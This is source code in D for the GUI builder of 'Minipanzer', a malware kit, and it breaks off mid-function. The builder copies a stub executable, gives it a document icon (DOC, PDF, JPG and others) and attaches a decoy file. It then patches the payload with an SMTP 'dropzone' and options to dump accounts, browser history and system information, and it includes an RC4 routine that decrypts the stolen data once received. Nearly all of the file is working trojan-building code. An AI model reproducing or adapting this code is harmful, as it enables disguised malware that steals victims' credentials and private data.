/*
 *
 *  Tool name	: Minipanzer
 *  Author	: Carrumba
 *  Contact	: megapanzer@gmail.com
 *  Date	: 1.07.2009
 *  Version	: 0.1
 *
 *  Todo 	: Proxy modification feature
 *                Hosts/DNS modification feature
 *        	  multi language support
 *  
 *  changes	: 
 *
 *
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *		  
 */




module Panzer.GUIServer_Modul;

private import dfl.all;
private import std.file;
private import std.path;
private import std.base64;
private import std.regexp;
private import std.string;
private import std.c.windows.windows;
private import Panzer.Config_Modul;
private import peinfo;




const int ID_ICON = 101;
char[SBOX_SIZE + 1] sBox;




class mainIcon
{


  /*
   * Constructor
   *
   */

  this()
  {
  }


  public static int changeMainIcon(char[] pIconSrcFile, char[] pDstBinary, int pIconIndex)
  {
    int lRetVal = 0;
    HANDLE lDstBinaryFH = INVALID_HANDLE_VALUE;
    HANDLE lFH = INVALID_HANDLE_VALUE;
    int lFileSize = 0;
    char *lICOContent = null;
    DWORD lDataRead = 0;
    ICONSIDEINFO lIconInfo;
    GROUPICON lGroupIconData;




    /*
     * Load icon
     *
     */


    if ((lICOContent = getResource(pIconSrcFile, pIconIndex, lFileSize)) != null)
    {
      if ((lDstBinaryFH = BeginUpdateResource(cast(char *) pDstBinary, 1)) != INVALID_HANDLE_VALUE)
      {

        /*
         * Parse ICO file and set structure values.
         *
         */

        lIconInfo.sIndex = 0; // If its an icon collection, define which icon should be used.
        parseICOConfig(cast(LPSTR) pIconSrcFile, lGroupIconData, lIconInfo);


        // Header settings
        lGroupIconData.Reserved1 = 0;
        lGroupIconData.ResourceType = 1;
        lGroupIconData.ImageCount = 1;
        // Directory Entry
        lGroupIconData.Reserved2 = 0;
        lGroupIconData.BitsPerPixel = 32;
        lGroupIconData.ImageSize = lFileSize;
        lGroupIconData.ResourceID = 1;


        /*
         * Update the resource
         *
         */

        if (UpdateResource(lDstBinaryFH, cast(LPCSTR) RT_ICON, cast(LPCSTR) MAKEINTRESOURCE(1), MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT), lICOContent, lFileSize) == 0)
          msgBox("NOK 1");

        if (UpdateResource(lDstBinaryFH, cast(LPCSTR) RT_GROUP_ICON, "MAINICON", MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT), &lGroupIconData, GROUPICON.sizeof) == 0)
          msgBox("NOK 2");

        if (EndUpdateResource(lDstBinaryFH, FALSE) == 0)
          msgBox("NOK 3");

      } // if (lDstBinaryFH = Begin...
      HeapFree(GetProcessHeap(), 0, lICOContent);
    } // if ((lICOContent = getResourc...



END:

    return(lRetVal);
  }







  /*
   * Read ICO picture settings.
   *
   */

  private static void parseICOConfig(LPSTR pICOSrcFile, ref GROUPICON pGroupIcon, ref ICONSIDEINFO pICOInfo)
  {
    HANDLE lFileHandle = INVALID_HANDLE_VALUE;
    DWORD lBytesRead = 0;
    int lCounter = 0;
    ICONDIR lIconDir;

    /*
     * Parse ICO file header.
     *
     */

    if((lFileHandle = CreateFile(pICOSrcFile, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, null, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, null)) != INVALID_HANDLE_VALUE)
    {
      ReadFile(lFileHandle, &(lIconDir.idReserved), WORD.sizeof, &lBytesRead, null);
      ReadFile(lFileHandle, &(lIconDir.idType), WORD.sizeof, &lBytesRead, null);
      ReadFile(lFileHandle, &(lIconDir.idCount), WORD.sizeof, &lBytesRead, null);


      /*
       * Parse the ICO file.
       *
       */

      if ((lIconDir.idEntries = cast(ICONDIRENTRY *) HeapAlloc(GetProcessHeap(), 8, ICONDIRENTRY.sizeof * lIconDir.idCount)) ! is null)
      {
         if (pICOInfo.sIndex >= lIconDir.idCount)
          pICOInfo.sIndex = 0;



        for(lCounter = 0; lCounter < lIconDir.idCount; lCounter++)
        {
          ReadFile(lFileHandle, &lIconDir.idEntries[lCounter], ICONDIRENTRY.sizeof, &lBytesRead, null);


          if (lCounter == pICOInfo.sIndex)
          {
            pGroupIcon.Height = lIconDir.idEntries[lCounter].bHeight;
            pGroupIcon.Width = lIconDir.idEntries[lCounter].bWidth;
            pGroupIcon.Planes = lIconDir.idEntries[lCounter].wPlanes;
            pGroupIcon.Colors = lIconDir.idEntries[lCounter].bColorCount;

            break;
          } // if (lCounter...
        } // for(lCounter =...
      } // if ((lIconDir.idE...
      CloseHandle(lFileHandle);
    } // if((lFileHandle = CreateF...
  }






  /*
   * Search through all resources inside the binary
   * locate the requested icon resource and load it.
   *
   */

  private static char *getResource(char[] pResourceFile, int pResource, ref int pImageSize)
  {
    HMODULE hLibrary;
    HRSRC hResource;
    HGLOBAL hResourceLoaded;
    LPBYTE lpBuffer;
    DWORD lResourceSize = 0;
    char *lRetVal = null;


    if ((hLibrary = LoadLibrary(cast(char *) pResourceFile)) ! is null)
    {
      if ((hResource = FindResource(hLibrary, MAKEINTRESOURCE(pResource), RT_ICON)) ! is null)
      {
        if ((hResourceLoaded = LoadResource(hLibrary, hResource)) ! is null)        
        {      
          if ((lpBuffer = cast(LPBYTE) LockResource(hResourceLoaded)) ! is null)            
          {                
            pImageSize = lResourceSize = SizeofResource(hLibrary, hResource);
 
            if (lResourceSize > 0 && (lRetVal = cast(char *) HeapAlloc(GetProcessHeap(), 0, lResourceSize)) ! is null)
            {
              std.c.string.memcpy(lRetVal, lpBuffer, lResourceSize);
            } // if (lResourceS...
          } // if ((lpBuffer = (LPBYTE) Lo...
          FreeResource(hResourceLoaded);
        } // if ((hResourceLoaded = LoadRes...
      } // if ((hResource = FindRes...
      FreeLibrary(hLibrary);
    } // if ((hLibrary = LoadLib...


    return(lRetVal);
  }


} // class...









class generatorForm: dfl.form.Form
{
  TabControl generatorTabControl;
  TabPage mMiniPanzerConfig;	
  TabPage mMiniPanzerActionsTabPage;
  TabPage mDataViewerTabPage;

  Button mDecryptButton;
  Button mGenerateButton;
  Button mExitButton;

  GroupBox mGeneralGroupBox;
  GroupBox mActionsGroupBox;

  ComboBox mMainIconsComboBox;

  TextBox mSMTPServerNameTextbox;
  TextBox mSMTPSenderNameTextbox;
  TextBox mSMTPRecepientNameTextbox;
  TextBox mMiniPanzerIDTextbox;
  TextBox mPasswordTextbox;
  TextBox mProgramNameTextbox;
  TextBox mDecryptDataTextbox;
  TextBox mDecryptPasswordTextbox;
  TextBox mNewProxyServerTextbox;
  TextBox mNewHostsEntriesTextbox;

  Label mSMTPServerNameLabel;
  Label mSMTPSenderNameLabel;
  Label mSMTPRecepientNameLabel;
  Label mIconTypeLabel;
  Label mMiniPanzerIDLabel;
  Label mPasswordLabel;
  Label mProgramNameLabel;
  Label mDecryptPasswordLabel;
  Label mSetProxyLabel;
  Label mSetHostEntryLabel;

  CheckBox mCollectSystemInformation;
  CheckBox mCollect3rdPartyAccounts;
  CheckBox mCollectBrowserHistory;
  CheckBox mCollectBrowserFavorites;

  char[] mProgramName;  
  
  public Label mEntertainerLabel;
  public TextBox mEntertainerFileTextBox;
  public Button mEntertainerFileButton;
 
  



  /*
   * Constructor
   *
   */

  this(char[] pProgramName)
  {
    mProgramName = pProgramName;
    icon = Application.resources.loadIcon(ID_ICON);
    initializeGeneratorForm();
  }
	





  /*
   * Form initialisation
   *
   */

  private void initializeGeneratorForm()
  {
    formBorderStyle = dfl.all.FormBorderStyle.FIXED_DIALOG;
    maximizeBox = false;
    text = gMainFormTitle;
    clientSize = dfl.all.Size(410, 455);


    /*
     * Create tabcontrol and tabpages
     *
     */

    generatorTabControl = new dfl.tabcontrol.TabControl();
    generatorTabControl.name = "generatorTabControl";
    generatorTabControl.bounds = dfl.all.Rect(8, 12, 392, 380);
    generatorTabControl.parent = this;
    generatorTabControl.selectedIndexChanged ~= &onSelectedIndexHasChanged;

    mMiniPanzerConfig = new TabPage("Minipanzer config");
    generatorTabControl.tabPages.add(mMiniPanzerConfig);

    mMiniPanzerActionsTabPage = new TabPage("Minipanzer actions");
    generatorTabControl.tabPages.add(mMiniPanzerActionsTabPage);
		
    mDataViewerTabPage = new TabPage("Data viewer");
    generatorTabControl.tabPages.add(mDataViewerTabPage);


    


    /*
     * Create group boxes
     *
     */

    mGeneralGroupBox = new GroupBox();
    mGeneralGroupBox.text = "Mini Panzer settings";
    mGeneralGroupBox.name = "GeneralGroupBox";
    mGeneralGroupBox.bounds = dfl.all.Rect(14, 14, 355, 320);
    mGeneralGroupBox.parent = mMiniPanzerConfig;

    mActionsGroupBox = new GroupBox();;
    mActionsGroupBox.text = "Actions";
    mActionsGroupBox.name = "GeneralGroupBox";
    mActionsGroupBox.bounds = dfl.all.Rect(14, 14, 355, 320); 
    mActionsGroupBox.parent = mMiniPanzerActionsTabPage;



    

    /*
     * Create buttons
     *
     */

    mGenerateButton = new dfl.button.Button();
    mGenerateButton.name = "generateButton";
    mGenerateButton.text = "Generate";
    mGenerateButton.bounds = dfl.all.Rect(224, 420, 75, 23);
    mGenerateButton.click ~= &onGenerateButtonClick;
    mGenerateButton.parent = this;

    
    mExitButton = new dfl.button.Button();
    mExitButton.name = "ExitButton";
    mExitButton.text = "Exit";
    mExitButton.bounds = dfl.all.Rect(320, 420, 75, 23);
    mExitButton.click ~= &onExitButtonClick;
    mExitButton.parent = this;


    mEntertainerFileButton = new dfl.button.Button();
    mEntertainerFileButton.name = "EntertainerFileButton";
    mEntertainerFileButton.text = "..";
    mEntertainerFileButton.bounds = Rect(335, 95, 10, 10); 
    mEntertainerFileButton.parent = mGeneralGroupBox;
    mEntertainerFileButton.click ~= &onFileOpenEntertainerButtonClick;   


    mDecryptButton = new dfl.button.Button();
    mDecryptButton.name = "decryptButton";
    mDecryptButton.text = "Decrypt";
    mDecryptButton.bounds = dfl.all.Rect(30, 320, 75, 23);
    mDecryptButton.parent = mDataViewerTabPage;
    mDecryptButton.click ~= &onDecryptButtonClick;

			
    /*
     * Create text boxes
     *
     */		

    mMiniPanzerIDTextbox = new TextBox();
    mMiniPanzerIDTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mMiniPanzerIDTextbox.bounds = dfl.all.Rect(140, 25, 190, 20);
    mMiniPanzerIDTextbox.parent = mGeneralGroupBox;        
		 
    mPasswordTextbox = new TextBox();
    mPasswordTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mPasswordTextbox.bounds = dfl.all.Rect(140, 55, 190, 20);
    mPasswordTextbox.parent = mGeneralGroupBox;

    mEntertainerFileTextBox = new dfl.textbox.TextBox();
    mEntertainerFileTextBox.name = "InputFileTextBox1";
    mEntertainerFileTextBox.bounds = Rect(140, 85, 190, 20);
    mEntertainerFileTextBox.parent = mGeneralGroupBox;
    mEntertainerFileTextBox.text = gDefaultEntertainer;

    mProgramNameTextbox = new TextBox();
    mProgramNameTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mProgramNameTextbox.bounds = dfl.all.Rect(140, 115, 190, 20); 
    mProgramNameTextbox.parent = mGeneralGroupBox;


    mSMTPServerNameTextbox = new TextBox();
    mSMTPServerNameTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mSMTPServerNameTextbox.bounds = dfl.all.Rect(140, 165, 190, 20);
    mSMTPServerNameTextbox.parent = mGeneralGroupBox;

    mSMTPSenderNameTextbox = new TextBox();
    mSMTPSenderNameTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mSMTPSenderNameTextbox.bounds = dfl.all.Rect(140, 195, 190, 20);
    mSMTPSenderNameTextbox.parent = mGeneralGroupBox;

    mSMTPRecepientNameTextbox = new TextBox();
    mSMTPRecepientNameTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mSMTPRecepientNameTextbox.bounds = dfl.all.Rect(140, 225, 190, 20);
    mSMTPRecepientNameTextbox.parent = mGeneralGroupBox;


    mDecryptPasswordTextbox = new TextBox();	
    mDecryptPasswordTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mDecryptPasswordTextbox.bounds = dfl.all.Rect(140, 30, 190, 20); //Rect(links, oben, breite, höhe
    mDecryptPasswordTextbox.parent = mDataViewerTabPage;  

    mDecryptDataTextbox = new TextBox();	
    mDecryptDataTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mDecryptDataTextbox.bounds = dfl.all.Rect(20, 60, 350, 240); //Rect(links, oben, breite, höhe
    mDecryptDataTextbox.text = "";
    mDecryptDataTextbox.multiline = true;
    mDecryptDataTextbox.acceptsReturn = true;	
    mDecryptDataTextbox.scrollBars = ScrollBars.BOTH;
    mDecryptDataTextbox.parent = mDataViewerTabPage;  

    mNewProxyServerTextbox = new TextBox();
    mNewProxyServerTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mNewProxyServerTextbox.bounds = dfl.all.Rect(140, 23, 159, 23); //Rect(links, oben, breite, höhe
    mNewProxyServerTextbox.parent = mActionsGroupBox;
    mNewProxyServerTextbox.enabled = false;

    mNewHostsEntriesTextbox = new TextBox();
    mNewHostsEntriesTextbox.borderStyle = dfl.all.BorderStyle.FIXED_3D;
    mNewHostsEntriesTextbox.bounds = dfl.all.Rect(140, 53, 159, 23); //Rect(links, oben, breite, höhe
    mNewHostsEntriesTextbox.parent = mActionsGroupBox;
    mNewHostsEntriesTextbox.enabled = false;


    /*
     * Create labels
     *
     */

    mMiniPanzerIDLabel = new Label();
    mMiniPanzerIDLabel.text = "Mini Panzer ID";
    mMiniPanzerIDLabel.bounds = Rect(20, 30, 110, 20);
    mMiniPanzerIDLabel.parent = mGeneralGroupBox;
        
    mPasswordLabel = new Label();
    mPasswordLabel.text = "Encryption password";
    mPasswordLabel.bounds = Rect(20, 60, 110, 20);
    mPasswordLabel.parent = mGeneralGroupBox;

    mEntertainerLabel = new dfl.label.Label();
    mEntertainerLabel.name = "EntertainerLabel";
    mEntertainerLabel.text = "EntertainerFile";
    mEntertainerLabel.bounds = Rect(20, 90, 110, 20);
    mEntertainerLabel.parent = mGeneralGroupBox;

    mProgramNameLabel = new Label();
    mProgramNameLabel.text = "Output program name";
    mProgramNameLabel.bounds = Rect(20, 120, 110, 20);
    mProgramNameLabel.parent = mGeneralGroupBox;


    mSMTPServerNameLabel = new Label();
    mSMTPServerNameLabel.text = "SMTP server name";
    mSMTPServerNameLabel.bounds = Rect(20, 170, 110, 20);
    mSMTPServerNameLabel.parent = mGeneralGroupBox;

    mSMTPSenderNameLabel = new Label();
    mSMTPSenderNameLabel.text = "SMTP sender address";
    mSMTPSenderNameLabel.bounds = Rect(20, 200, 110, 20);
    mSMTPSenderNameLabel.parent = mGeneralGroupBox;
    
    mSMTPRecepientNameLabel = new Label();
    mSMTPRecepientNameLabel.text = "SMTP recipient address";
    mSMTPRecepientNameLabel.bounds = Rect(20, 230, 110, 20);
    mSMTPRecepientNameLabel.parent = mGeneralGroupBox;


    mIconTypeLabel = new Label();
    mIconTypeLabel.text = "Main icon type";
    mIconTypeLabel.bounds = Rect(20, 280, 110, 20);
    mIconTypeLabel.parent = mGeneralGroupBox;
    

    
    mDecryptPasswordLabel = new Label();
    mDecryptPasswordLabel.text = "Decryption password";
    mDecryptPasswordLabel.bounds = Rect(20, 30, 110, 20);
    mDecryptPasswordLabel.parent = mDataViewerTabPage;

    mSetProxyLabel = new Label();
    mSetProxyLabel.text = "New proxy server";
    mSetProxyLabel.bounds = Rect(22, 28, 90, 23);
    mSetProxyLabel.parent = mActionsGroupBox;
    mSetProxyLabel.enabled = false;

    mSetHostEntryLabel = new Label();
    mSetHostEntryLabel.text = "New hosts entries";
    mSetHostEntryLabel.bounds = Rect(22, 58, 90, 23);
    mSetHostEntryLabel.parent = mActionsGroupBox;
    mSetHostEntryLabel.enabled = false;



    /*
     * Create check boxes
     *
     */

    mCollectSystemInformation = new dfl.button.CheckBox();
    mCollectSystemInformation.name = "CollectAccountscheckBox";
    mCollectSystemInformation.text = "Dump system information";
    mCollectSystemInformation.bounds = dfl.base.Rect(22, 88, 159, 23);
    mCollectSystemInformation.parent = mActionsGroupBox;

    mCollect3rdPartyAccounts = new dfl.button.CheckBox();
    mCollect3rdPartyAccounts.name = "mCollect3rdPartyAccounts";
    mCollect3rdPartyAccounts.text = "Dump 3rd party accounts";
    mCollect3rdPartyAccounts.bounds = dfl.base.Rect(180, 118, 159, 23);
    mCollect3rdPartyAccounts.parent = mActionsGroupBox;
    
    
    mCollectBrowserHistory = new dfl.button.CheckBox();
    mCollectBrowserHistory.name = "DumpBrowserHistorycheckBox";
    mCollectBrowserHistory.text = "Dump browser history";
    mCollectBrowserHistory.bounds = dfl.base.Rect(180, 88, 159, 23);
    mCollectBrowserHistory.parent = mActionsGroupBox;

    mCollectBrowserFavorites = new dfl.button.CheckBox();
    mCollectBrowserFavorites.name = "DumpBrowserFavoritescheckBox";
    mCollectBrowserFavorites.text = "Dump browser favorites";
    mCollectBrowserFavorites.bounds = dfl.base.Rect(22, 118, 159, 23);
    mCollectBrowserFavorites.parent = mActionsGroupBox;


    /*
     * Create combo box.
     *
     */

    mMainIconsComboBox = new ComboBox();
    mMainIconsComboBox.text = "Select main icon type";
    mMainIconsComboBox.width = 150;
    mMainIconsComboBox.items.add("DOC");
    mMainIconsComboBox.items.add("HTM");
    mMainIconsComboBox.items.add("JPG");
    mMainIconsComboBox.items.add("PDF");
    mMainIconsComboBox.items.add("PPT");
    mMainIconsComboBox.items.add("XLS");
    mMainIconsComboBox.items.add("ZIP");
    mMainIconsComboBox.bounds = Rect(140, 280, 140, 20);
    mMainIconsComboBox.parent = mGeneralGroupBox;
  }
		
	





  /*
   * Event function "OpenEntertainer"
   *
   */	
	
  void onFileOpenEntertainerButtonClick(Object sender, EventArgs ea)
  {
    char[] lOldWorkingDirectory = getcwd();
    OpenFileDialog lOpenFileDialog;

    lOpenFileDialog = new OpenFileDialog;

    if (lOpenFileDialog ! is null)
    {
      lOpenFileDialog.defaultExt = "";
      if(DialogResult.OK == lOpenFileDialog.showDialog())
       mEntertainerFileTextBox.text = lOpenFileDialog.fileName;

      delete(lOpenFileDialog);
    } // if (! (mOpenFileDialog is null))
    chdir(lOldWorkingDirectory);	  
  }
	
	
	





  /*
   * Event button "decrypt"
   *
   */

  private void onDecryptButtonClick(Object sender, EventArgs  ea)	
  {
    char[] lCipherText;
    char[] lPlainText;
    int lOutputLength;


    /*
     * We received output in b64 format. http replaces "+" by " " and we have to reset the "+"-sign.
     *
     */

    mDecryptDataTextbox.text = sub(mDecryptDataTextbox.text, " ", "+", "g");

    try
    {
      lCipherText = decode(mDecryptDataTextbox.text);
      lPlainText = new char[lCipherText.length * 2];

      if (mDecryptPasswordTextbox.text.length > 0)
        encrypt(mDecryptPasswordTextbox.text, lCipherText, lPlainText, lOutputLength);
      else 
        lPlainText = lCipherText;

      lPlainText = sub(lPlainText, "\\|", "\r\n", "g");
      mDecryptDataTextbox.text = UTF8Compliance(lPlainText);

    } catch (Exception e) {
      msgBox("exception \"" ~ e.toString() ~ "\"  occured");
    }
  }




  /*
   *
   *
   */


  private void onSelectedIndexHasChanged(Object sender, EventArgs ea)
  {

    if (generatorTabControl.selectedIndex == 2) 
    {
      mGenerateButton.enabled = false;
      mExitButton.enabled = true;
    } else {
      mGenerateButton.enabled = true;
      mExitButton.enabled = true;
    }
  }



  /*
   *
   *
   */

  private void onExitButtonClick(Object sender, EventArgs  ea)	
  {
    dispose();
  }




  /*
   * Event button "generate"
   *
   */

  private void onGenerateButtonClick(Object sender, EventArgs  ea)
  {
    char[] lTemp;
    char[] lTempBuffer;
    char[] lNewPackageName;
    int lRetVal = 0;
    int lIndex = 0;
    int lIconIndex = 0;

    uint lMSCrapStartAddress = 0;
    uint lMSCrapStopAddress = 0;
    sFileData lFileHeader;
    Object lSelectedIcon;


    /*
     * before generating the new package, check if all preconditions are fulfilled.
     *
     */

    if (! exists(gPackagesOutputDir))
    {
      msgBox("Output directory \"" ~ gPackagesOutputDir ~ "\" does not exist!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);
      goto END;
    } else if (! exists(gStubPath)) {
      msgBox("Stub file \"" ~ gStubPath ~ "\" does not exist!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);        
      goto END;
    } else if (! exists(gPayload)) {
      msgBox("Effective Panzer payload file \"" ~ gPayload ~ "\" does not exist!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);        
      goto END; 
    } else if (! exists(mEntertainerFileTextBox.text)) {
      msgBox("Entertainer file \"" ~ mEntertainerFileTextBox.text ~ "\" does not exist!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);        
      goto END; 
    }	    




    /*
     * Check if all mandatory textboxes contain a value
     *
     */

    if (mMiniPanzerIDTextbox.text.length <= 0)
    {
      msgBox("No system ID defined!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;
    } else if (mPasswordTextbox.text.length <= 0) {
      msgBox("No password defined!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;
    } else if (mProgramNameTextbox.text.length <= 0) {
      msgBox("No program name defined!", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;   	          		
    } else if (mSMTPServerNameTextbox.text.length <= 0) {
      msgBox("No SMTP server defined.", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;
    } else if (mSMTPSenderNameTextbox.text.length <= 0) {
      msgBox("No SMTP sender defined.", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;
    } else if (mSMTPSenderNameTextbox.text.length <= 0) {
      msgBox("No SMTP recipient defined.", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;
    } else if (mMainIconsComboBox.selectedItem is null) {
      msgBox("No main icon type selected.", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);     
      goto END;
    }

  



    /*
     * Prepare a new stub
     *
     */

    // copy stub to new filename
    lNewPackageName = gPackagesOutputDir ~ "Package_" ~ mMiniPanzerIDTextbox.text ~ ".exe";
    copy(gStubPath, lNewPackageName); 
   
    /*
     * Change the stub main icon.
     *
     */


    lSelectedIcon = mMainIconsComboBox.selectedItem;
    if (lSelectedIcon ! is null)
    {

      lTemp = lSelectedIcon.toString();

      if (lTemp == "DOC")
      {
        lIconIndex = 3;
      } else if (lTemp == "HTM") {
        lIconIndex = 5;
      } else if (lTemp == "JPG") {
        lIconIndex = 7;
      } else if (lTemp == "PDF") {
        lIconIndex = 2;
      } else if (lTemp == "PPT") {
        lIconIndex = 6;
      } else if (lTemp == "XLS") {
        lIconIndex = 4;
      } else if (lTemp == "ZIP") {
        lIconIndex = 8;
      }

      mainIcon.changeMainIcon(mProgramName, lNewPackageName, lIconIndex);
    }

    
    lTempBuffer = cast(char[]) read(lNewPackageName);


    /*
     * Prepare entertainer and add it to the stub
     *
     */

    try
    {
      std.c.string.memset(&lFileHeader, 0, sFileData.sizeof);
      lTempBuffer = cast(char[]) read(mEntertainerFileTextBox.text);

      lFileHeader.lDataHeader[0..gTitleDataHeader.length] = gTitleDataHeader[0..gTitleDataHeader.length];
      lFileHeader.lName[0..std.path.getBaseName(mEntertainerFileTextBox.text).length] = std.path.getBaseName(mEntertainerFileTextBox.text)[0..std.path.getBaseName(mEntertainerFileTextBox.text).length];
      lFileHeader.lSize = lTempBuffer.length;

      lTemp = new char[sFileData.sizeof];
      std.c.string.memset(lTemp.ptr, 0, lTemp.length);
      std.c.string.memcpy(lTemp.ptr, &lFileHeader, sFileData.sizeof);
      append(lNewPackageName, cast(void[]) lTemp);
      append(lNewPackageName, lTempBuffer);
    } catch (Exception e) {
      msgBox("Can't add entertainer. Error msg : " ~ e.toString);
    }



    /*
     * Customize minipanzer payload
     *
     */

    lTempBuffer = cast(char[]) read(gPayload);

    if ((lIndex = std.string.find(lTempBuffer, "SYN_ID")) >= 0)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_ID", mMiniPanzerIDTextbox.text);

    if ((lIndex = std.string.find(lTempBuffer, "SYN_PW")) >= 0)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_PW", mPasswordTextbox.text);



    /*
     * Set the dropzone SMTP data
     *
     */

    if ((lIndex = std.string.find(lTempBuffer, "SYN_SMTP_SERVER")) >= 0)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_SMTP_SERVER", mSMTPServerNameTextbox.text);

    if ((lIndex = std.string.find(lTempBuffer, "SYN_SMTP_RCPT")) >= 0)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_SMTP_RCPT", mSMTPRecepientNameTextbox.text);

    if ((lIndex = std.string.find(lTempBuffer, "SYN_SMTP_SENDER")) >= 0)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_SMTP_SENDER", mSMTPSenderNameTextbox.text);



    /*
     * 
     *
     */

    if (mCollect3rdPartyAccounts.checked)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_DUMP_3RDPARTIES_ACCOUNTS", "Y");


    if (mCollectSystemInformation.checked)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_DUMP_SYSTEMINFO", "Y");


    if (mCollectBrowserFavorites.checked)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_DUMP_FAVORITES", "Y");


    if (mCollectBrowserHistory.checked)
      lTempBuffer = replaceConstant(lTempBuffer, "SYN_DUMP_HISTORY", "Y");








   /*
    * Clean useless fragments inside the binary.
    *
    */


    MSSpecificSlice(gPayload, lMSCrapStartAddress, lMSCrapStopAddress);

    for (lIndex = lMSCrapStartAddress; lIndex < lMSCrapStopAddress; lIndex++)
      lTempBuffer[lIndex] = '\0';


    /*
     * Append payload to stub
     *
     */

    try
    {
      std.c.string.memset(&lFileHeader, 0, sFileData.sizeof);

      lFileHeader.lDataHeader[0..gTitleDataHeader.length] = gTitleDataHeader[0..gTitleDataHeader.length];
      lFileHeader.lName[0..mProgramNameTextbox.text.length] = mProgramNameTextbox.text[0..mProgramNameTextbox.text.length];
      lFileHeader.lSize = lTempBuffer.length;

      lTemp = new char[sFileData.sizeof];
      std.c.string.memset(lTemp.ptr, 0, lTemp.length);
      std.c.string.memcpy(lTemp.ptr, &lFileHeader, sFileData.sizeof);
      append(lNewPackageName, cast(void[]) lTemp);
      append(lNewPackageName, lTempBuffer);


    } catch (Exception e) {
      msgBox("Can't add payload. Error msg : " ~ e.toString);
    }


		
    if (! exists(lNewPackageName))
    {
      msgBox("Can't generate new Mini Panzer binary.", "Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);        	    
      goto END;
    }


    if (exists (lNewPackageName))
      msgBox("1 New Mini panzer package generated. You can fand it under " ~ lNewPackageName, "Information", MsgBoxButtons.OK, MsgBoxIcon.INFORMATION);        
    else
      msgBox("1 Unable to generate new package", "Information", MsgBoxButtons.OK, MsgBoxIcon.INFORMATION);        	    

END:

    return(lRetVal);    
  }




  /*
   * Replace-function
   *
   */

  private char[] replaceConstant(char[] pString, char[] pSearch, char[] pReplace)
  {
    int lIndex;
    int lCounter;

    if ((lIndex = std.string.find(pString, pSearch)) >= 0)
    {
      for (lCounter = 0; lCounter < pReplace.length; lCounter++)
        pString[lIndex + lCounter] = pReplace[lCounter];



      /*
       * overwrite the rest of the banner
       *
       */

      while (pString[lIndex + lCounter] != '\0' && lCounter < 48)
      {
        pString[lIndex + lCounter] = '\0';
        lCounter++;
      }
    }

    return(pString);
  }

} // class generatorForm ...









/*
 * Program entry point
 *
 */


int main(char[][] args)
{
  int lRetVal = 0;
  DWORD lStartAddr = 0;
  DWORD lStopAddr = 0;




  /*
   * Create log directories
   *
   */

  try
  {
    if (! exists(gPackagesOutputDir))
      mkdir(gPackagesOutputDir);
  } catch (FileException fe) {
  }



  /*
   * Start Minipanzer forms
   *
   */

  try
  {
    Application.run(new generatorForm(args[0]));
  }
 

  catch(Object lErrorObject)
  {
    msgBox(lErrorObject.toString(), "Fatal Error", MsgBoxButtons.OK, MsgBoxIcon.ERROR);		
    lRetVal = 1;
  }




  return(lRetVal);
}









/*
 * Encrypt a passed string
 *
 */

int encrypt(char[] pKey, char[] pPlainText, inout char[] pCipherText, inout int pOutputLength)
{
  int c = 0;
  int i = 0;
  int j = 0;
  int t = 0;
  char[] mPlainText;
  char _key[];
  int mRetVal = 0;

  _key = pKey;
  mPlainText = pPlainText;
  preparekey(_key);
  pOutputLength = 0;


  for (c = 0; c < pPlainText.length && c < pPlainText.length; c++)
  {

    i = (i + 1) % 256;
    j = (j + sBox[i]) % 256;
    t = sBox[i];
    sBox[i] = sBox[j];
    sBox[j] = t;

    t = (sBox[i] + sBox[j]) % 256;
    pCipherText[c] = mPlainText[c] ^ sBox[t];
  }

  pOutputLength = c;


  return(mRetVal);
}







/*
 * Encryption initialisation
 *
 */

int preparekey(char[] pKey)
{
  int mLen = 0;
  int i = 0;
  int j = 0;
  int t = 0;

  mLen = pKey.length; //strlen(cast(char *) pKey);

  for (i = 0; i < 256; i++)
    sBox[i] = i;

  for (i = 0; i < 256; i++)
  {
    j = (j + sBox[i] + pKey[i % mLen]) % 256;
    t = sBox[i];
    sBox[i] = sBox[j];
    sBox[j] = t;
  }
  return(0);
}









/*
 * Neutralize some bytes in the PE header section
 *
 */

int MSSpecificSlice(char[] pInputFile, inout uint pStartAddress, inout uint pStopAddress)
{
  PEInfo pe = new PEInfo;
  int lRetVal = 0;

  try
  {
